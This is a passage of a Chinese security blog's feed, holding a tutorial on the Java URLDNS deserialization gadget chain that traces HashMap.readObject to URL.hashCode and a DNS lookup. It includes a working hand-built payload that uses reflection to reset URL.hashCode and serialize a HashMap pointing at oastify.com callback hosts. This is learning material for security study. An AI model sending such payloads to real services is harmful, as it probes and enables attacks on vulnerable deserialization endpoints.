    <summary type="html">&lt;p&gt;这个是之前学过一点的，但是当时只是基于理论而没有动手实践，就像在看政治知识点，一段时间就忘记了，这次系统的来学一下，我本想是和上一期一样进行链条梳理一遍，但是发现那样就只能知道链条可以这么打，但是这是怎么来，为什么要这么打的问题就没法得到解决，所以还是正面来一遍吧。&lt;/p&gt;</summary>
      
    
    
    
    <category term="Java_Security" scheme="https://usingns.github.io/categories/Java-Security/"/>
    
    
    <category term="Java" scheme="https://usingns.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS反序列化利用链(从百草园写到三味书屋)</title>
    <link href="https://usingns.github.io/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/"/>
    <id>https://usingns.github.io/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/</id>
    <published>2025-07-15T09:33:11.000Z</published>
    <updated>2025-07-16T00:42:08.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="选择原因：环境要求少"><a href="#选择原因：环境要求少" class="headerlink" title="选择原因：环境要求少"></a>选择原因：环境要求少</h1><p><mark>少有的对环境没有什么要求的链子</mark><br>作用：被反序列化的时候发起DNS请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><h1 id="简单演示利用过程"><a href="#简单演示利用过程" class="headerlink" title="简单演示利用过程"></a>简单演示利用过程</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 序列化：将对象写入文件</span><br><span class="line"></span><br><span class="line">    public static void serialize(String path, Object obj) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(path))) &#123;</span><br><span class="line"></span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;对象已序列化写入文件：&quot; + path);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 反序列化：从文件中读取对象</span><br><span class="line"></span><br><span class="line">    public static Object deserialize(String path) throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path))) &#123;</span><br><span class="line"></span><br><span class="line">            Object obj = ois.readObject();</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;对象已从文件反序列化：&quot; + path);</span><br><span class="line"></span><br><span class="line">            return obj;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        // 从文件反序列化对象（文件名应存在）</span><br><span class="line"></span><br><span class="line">        Object obj = deserialize(&quot;urldns.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 实例化一个 HashMap（没用上，仅作为演示）</span><br><span class="line"></span><br><span class="line">        new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用yso生成访问<a href="http://ygik9waxo2t8418l9pu8cffnaeg54wykn.oastify.com的bin文件/">http://ygik9waxo2t8418l9pu8cffnaeg54wykn.oastify.com的bin文件</a><br>使得程序反序列化该二进制文件</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/1.png" class=""><h1 id="分析链子"><a href="#分析链子" class="headerlink" title="分析链子"></a>分析链子</h1><p>再看回链子的调用过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><h2 id="最后一步getHostAddress"><a href="#最后一步getHostAddress" class="headerlink" title="最后一步getHostAddress()"></a>最后一步getHostAddress()</h2><p>URL类重写了hashCode()函数</p><p>URL.hashCode()</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/2.png" class=""><p>实现了序列化接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#URL.hashCode()</span><br><span class="line"></span><br><span class="line">    public synchronized int hashCode() &#123;</span><br><span class="line"></span><br><span class="line">        if (hashCode != -1)</span><br><span class="line"></span><br><span class="line">            return hashCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(this);</span><br><span class="line"></span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>判断是否等于-1<br>然后<mark>调用hashcode()</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#hashcode()</span><br><span class="line"></span><br><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line"></span><br><span class="line">        int h = 0;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // Generate the protocol part.</span><br><span class="line"></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line"></span><br><span class="line">        if (protocol != null)</span><br><span class="line"></span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // Generate the host part.</span><br><span class="line"></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line"></span><br><span class="line">        if (addr != null) &#123;</span><br><span class="line"></span><br><span class="line">            h += addr.hashCode();</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            String host = u.getHost();</span><br><span class="line"></span><br><span class="line">            if (host != null)</span><br><span class="line"></span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // Generate the file part.</span><br><span class="line"></span><br><span class="line">        String file = u.getFile();</span><br><span class="line"></span><br><span class="line">        if (file != null)</span><br><span class="line"></span><br><span class="line">            h += file.hashCode(...</span><br></pre></td></tr></table></figure><p>关键在        InetAddress addr &#x3D; getHostAddress(u);<br>这里是一个是从主机获取ip地址</p><h2 id="如何一步步调用"><a href="#如何一步步调用" class="headerlink" title="如何一步步调用"></a>如何一步步调用</h2><p>HashMap里面的readObject()也是被重写过的，且符合固定签名的，所以反序列化的时候会被一并执行</p><p>里面有一段功能是读取键和值，然后放进映射的Hashmap中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="line"></span><br><span class="line">for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line"></span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line"></span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line"></span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line"></span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line"></span><br><span class="line">    putVal(hash(key), key, value, false, false);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashMap中存储的都是键值对，键是一个对象，值也是一个对象，在反序列化的时候会把其中存储的对象都一个个恢复过来，键和值也是调用了readObject()反序列化回来的，并且执行了一个关键操作putVal()函数。这个函数的第一个传参就是hash(key)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, false, false)</span><br></pre></td></tr></table></figure><p>在反序列化存储键和值的时候，执行了一个Hash函数，重新去计算Key的Hash值</p><p>我们点进这个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line"></span><br><span class="line">    int h;</span><br><span class="line"></span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的是一个对象key，有一步会计算key的hashCode即<mark>key.hashCode()</mark>，如何对象等于NULL，也就是这个对象不存在，那么它的HashCode就赋值为0，如果存在的话就会调用这个对象的HashCode函数</p><p><mark>也就是说在这一步的时候，HashMap类的重写过的并且在反序列化的时候会被调用的readObject()函数会使用函数putVal()去调用了反序列化对象的HasCode()函数</mark></p><p>而当这个对象是URL类实例对象的时候，就很有意思了。<br>因为URL的HashCode()我们之前分析过，是被重写过的，是在进行和-1的比较之后，进行再一次的HashCode()函数运算的，而再一步的HashCode()函数运算我们之前已经分析过了，是会对域名进行一次DNS请求以获得ip的，这样就连起来了。</p><p>不过这里的hashCode需要等于-1，即URL实例化对象的hashCode &#x3D; -1</p><p>还有一个就是URL在HashMap中，需要作为key值存在<br>也就是需要new HashMap&lt;URL,Object&gt;();</p><p>但是这里还有一个问题就是链子里面为什么会有HashMap.hash()</p><p>是因为<code>HashMap</code> 在反序列化过程中，重写了 <code>readObject()</code> 方法，重新计算 key 的 <code>hashCode()</code> 是为了将键值对插入到正确的哈希桶（bucket）中，从而重建哈希表结构。因为序列化过程中只保存了键值对，而没有保存内部的哈希数组结构（如 bucket 索引），所以反序列化后需要通过 <code>hashCode()</code> 重建哈希索引结构。这就是官方为什么要这么做的原因，我们当然也需要触发这个才能反序列化成一个正确的结果。</p><p>不过要知道new HashMap&lt;URL,Object&gt;()里面的Object的hashCode()是一个native方法，一般它的值是内存地址，这个hashcode的作用是比较两个内存是否相等，如果对象的hashcode一致就说明相等就这肯定是同一个对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">//代码没复制全</span><br><span class="line">    public native int hashCode();</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line"></span><br><span class="line">     * Indicates whether some other object is &quot;equal to&quot; this one.</span><br><span class="line"></span><br><span class="line">     * &lt;p&gt;</span><br><span class="line"></span><br><span class="line">     * The &#123;@code equals&#125; method implements an equivalence relation</span><br><span class="line"></span><br><span class="line">     * on non-null object references:</span><br><span class="line"></span><br><span class="line">     * &lt;ul&gt;</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;reflexive&lt;/i&gt;: for any non-null reference value</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125;, &#123;@code x.equals(x)&#125; should return</span><br><span class="line"></span><br><span class="line">     *     &#123;@code true&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;symmetric&lt;/i&gt;: for any non-null reference values</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125; and &#123;@code y&#125;, &#123;@code x.equals(y)&#125;</span><br><span class="line"></span><br><span class="line">     *     should return &#123;@code true&#125; if and only if</span><br><span class="line"></span><br><span class="line">     *     &#123;@code y.equals(x)&#125; returns &#123;@code true&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;transitive&lt;/i&gt;: for any non-null reference values</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125;, &#123;@code y&#125;, and &#123;@code z&#125;, if</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(y)&#125; returns &#123;@code true&#125; and</span><br><span class="line"></span><br><span class="line">     *     &#123;@code y.equals(z)&#125; returns &#123;@code true&#125;, then</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(z)&#125; should return &#123;@code true&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;consistent&lt;/i&gt;: for any non-null reference values</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125; and &#123;@code y&#125;, multiple invocations of</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(y)&#125; consistently return &#123;@code true&#125;</span><br><span class="line"></span><br><span class="line">     *     or consistently return &#123;@code false&#125;, provided no</span><br><span class="line"></span><br><span class="line">     *     information used in &#123;@code equals&#125; comparisons on the</span><br><span class="line"></span><br><span class="line">     *     objects is modified.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;For any non-null reference value &#123;@code x&#125;,</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(null)&#125; should return &#123;@code false&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     后面的代码没贴上...这里是用来补充说明，知道是干什么的就行了</span><br></pre></td></tr></table></figure><p>如果使用原生的hashcode的话确实可能会出现明明是两个一样的对象却取不到相等的问题，因为比较的是内存地址。</p><h2 id="亲手构造"><a href="#亲手构造" class="headerlink" title="亲手构造"></a>亲手构造</h2><p>像是前面的yso工具使用，进行反序列化，我们同样可以手搓一个链子，其实链子很简单</p><p>把之前的代码改成这个样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    // 从文件反序列化对象（文件名应存在）</span><br><span class="line"></span><br><span class="line">    Object obj = deserialize(&quot;urldns.bin&quot;);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 实例化一个 HashMap（没用上，仅作为演示）</span><br><span class="line"></span><br><span class="line">    HashMap&lt;URL,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    map.put(new URL(&quot;http://iqcz9l67slpsptzhs8ce04xmkdq4eu2j.oastify.com&quot;), null);</span><br></pre></td></tr></table></figure><p>不过接下来还不能直接序列化，一个是URL的hashCode！&#x3D;-1，一个是这里的put传入的时候会请求调用这个，但是一开始的值还不能是-1。</p><p>什么意思呢，意思就是说我们调用的最后一步URL.hachCode()的时候需要等于-1，这样才能触发新一次hash计算从而请求ip。我们还需要在put进HashMap类的时候不是-1，这里有一个很大的易错点，首先我们点进map.put</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line"></span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的K是一个虚方法，虚方法是Java应对继承和多态的方法即支持动态绑定，它是什么类K就动态变成什么类，你调用的方法就是什么类的方法，是通过虚方法表指针所实现。</p><p>此外所有非static、非final、非private的方法默认都是虚方法（JLS 15.12.4.4），也就是说：<br>    <code>public void foo() &#123;&#125;</code> 是虚方法；<br>    <code>private void bar()</code> 不是虚方法，编译器会静态绑定；<br> <code>final void baz()</code> 不是虚方法，调用时静态绑定。</p><ul><li>静态方法和构造方法不是虚方法。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Animal &#123;</span><br><span class="line">    void sound() &#123; System.out.println(&quot;Animal sound&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Dog extends Animal &#123;</span><br><span class="line">    @Override</span><br><span class="line">    void sound() &#123; System.out.println(&quot;Woof&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Animal a = new Dog();</span><br><span class="line">a.sound();  // 输出 &quot;Woof&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说回刚才的地方，首先我们点进map.put</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line"></span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">    //这里也就是 return putVal(hash(url), key, value, false, true);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hash(url)执行hashMap类的hash()方法，点击进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  static final int hash(Object key) &#123;</span><br><span class="line"></span><br><span class="line">      int h;</span><br><span class="line"></span><br><span class="line">      return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">      //这里也就是return (key == null) ? 0 : (h = url.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">//url是K虚方法类型，所以动态为URL.hashCode()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>那URL.hashCode()干了什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line"></span><br><span class="line">    if (hashCode != -1)</span><br><span class="line"></span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line"></span><br><span class="line">    return hashCode;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行了-1的比较，这就是开始的hashCode我们为什么需要她！&#x3D;-1，然后等于-1，所以进行这里的计算hashCode &#x3D; handler.hashCode(this);直接把恶意url传入this里，也就是分析链子的第一步所讲的，触发了请求ip</p><p>操作就很简单了，开始把url拿出来，通过反射机制修改它的hashCode，反射机制之前的文章写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"></span><br><span class="line">URL url = new URL(&quot;http://kma15n29onlulvvjoa8gw6togfm6axym.oastify.com&quot;);</span><br><span class="line"></span><br><span class="line">Field hashCode = URL.class.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line"></span><br><span class="line">hashCode.setAccessible(true);</span><br><span class="line"></span><br><span class="line">hashCode.setInt(url, 24);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">HashMap&lt;URL,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">map.put(url, null);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">hashCode.setInt(url, -1);</span><br><span class="line"></span><br><span class="line">serialize(&quot;url.bin&quot;,map);</span><br></pre></td></tr></table></figure><p>会发现生成url.bin，反序列化该文件拿到结果，大功告成</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/3.png" class=""><p><mark>不过所有的前提都是这些类实现了序列化</mark><br><mark>public class xx implements java.io.Serializable</mark><br><mark>这样才能通过序列化和反序列化进行构造</mark></p><h1 id="关于readObject-特殊性的说明"><a href="#关于readObject-特殊性的说明" class="headerlink" title="关于readObject()特殊性的说明"></a>关于readObject()特殊性的说明</h1><h2 id="特别区分"><a href="#特别区分" class="headerlink" title="特别区分"></a>特别区分</h2><p>首先在反序列化的时候，对象的所有变量方法都会被调用吗？<mark>当然不是</mark></p><h3 id="Java中的反序列化"><a href="#Java中的反序列化" class="headerlink" title="Java中的反序列化"></a>Java中的反序列化</h3><h4 id="1-基础机制"><a href="#1-基础机制" class="headerlink" title="1.基础机制"></a>1.基础机制</h4><p>Java 反序列化时会执行：</p><ul><li>构造对象（绕过构造器 <code>constructor</code>）</li><li>如果类定义了 <code>private void readObject(ObjectInputStream in)</code> 方法，则会调用它进行反序列化定制处理。</li><li>成员变量被还原</li></ul><h4 id="2-不会被调用的东西"><a href="#2-不会被调用的东西" class="headerlink" title="2.不会被调用的东西"></a>2.不会被调用的东西</h4><ul><li>不会调用构造函数（constructor）</li><li>不会自动调用普通方法</li><li>静态变量不会被还原</li><li>transient 修饰的变量不会被反序列化还原</li></ul><h4 id="3-调用顺序"><a href="#3-调用顺序" class="headerlink" title="3. 调用顺序"></a>3. 调用顺序</h4><p>如果类实现了 <code>Serializable</code> 且存在：<br><code>private void readObject(ObjectInputStream in)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">那么反序列化过程大致为：</span><br><span class="line">`ObjectInputStream.readObject() → </span><br><span class="line">构造对象实例（跳过构造器） → </span><br><span class="line">调用 readObject(in) 方法（如果有） → </span><br><span class="line">返回还原好的对象`</span><br></pre></td></tr></table></figure><p><strong>注意：readObject() 是关键点，是链式调用的入口。</strong></p><h3 id="PHP-中反序列化行为"><a href="#PHP-中反序列化行为" class="headerlink" title="PHP 中反序列化行为"></a>PHP 中反序列化行为</h3><h4 id="1-可能会调用的方法"><a href="#1-可能会调用的方法" class="headerlink" title="1. 可能会调用的方法"></a>1. 可能会调用的方法</h4><p>魔术方法<br><code>function __wakeup() &#123;&#125;</code></p><p>那么反序列化过程中，<code>__wakeup()</code> 会在对象还原后被自动调用。</p><h4 id="2-不会调用构造函数-construct"><a href="#2-不会调用构造函数-construct" class="headerlink" title="2. 不会调用构造函数 __construct()"></a>2. 不会调用构造函数 <code>__construct()</code></h4><p>也不会调用普通方法，除非通过魔术函数触发（如 <code>__call()</code>）。</p><h4 id="3-属性还原"><a href="#3-属性还原" class="headerlink" title="3. 属性还原"></a>3. 属性还原</h4><ul><li>所有公开&#x2F;受保护&#x2F;私有属性会被还原</li><li>静态属性不会被还原（因为不是实例级的）</li></ul><h4 id="4-特殊点"><a href="#4-特殊点" class="headerlink" title="4. 特殊点"></a>4. 特殊点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP 7+ 引入了 Serializable 接口（注意和 Java 名字一样，但作用不同）：</span><br><span class="line"></span><br><span class="line">interface Serializable &#123;  </span><br><span class="line">public function serialize();  </span><br><span class="line">public function unserialize($data); 